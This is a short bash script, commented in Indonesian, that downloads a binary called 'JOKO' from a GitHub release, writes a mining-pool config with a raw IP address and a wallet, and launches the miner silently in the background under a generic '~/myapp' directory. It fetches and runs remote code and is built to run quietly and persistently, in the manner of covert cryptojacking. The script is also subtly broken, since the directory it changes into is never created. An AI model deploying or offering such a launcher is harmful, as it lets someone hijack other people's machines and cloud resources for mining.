#!/bin/bash

# Direktori kerja
APP_DIR=~/myapp
MINER_DIR="$APP_DIR/JOKO"
CONFIG_FILE="$MINER_DIR/config.json"

# Cek apakah sudah dijalankan sebelumnya
if pgrep -f "./JOKO -c config.json" > /dev/null; then
    echo "Miner sudah berjalan. Keluar."
    exit 0
fi

# Buat direktori jika belum ada
mkdir -p "$APP_DIR"
cd "$APP_DIR"

# Unduh dan ekstrak hanya jika belum ada
if [ ! -d "$MINER_DIR" ]; then
    wget -q https://github.com/vokerjok/Voker/releases/download/Voker/JOKO 
    
fi

cd "$MINER_DIR"

# Buat file config
cat > "$CONFIG_FILE" <<END
{
  "url": "159.203.13.225:443",
  "user": "AQ3C1kkkhJwEKSTncTvKeA5iPfdzhP8Pox.joko",
  "pass": "x",
  "threads": 8,
  "algo": "yespoweradvc"
}
END

# Set permission
chmod +x "$MINER_DIR/JOKO" "$CONFIG_FILE"

# Jalankan miner
nohup ./JOKO -c config.json > /dev/null 2>&1 &
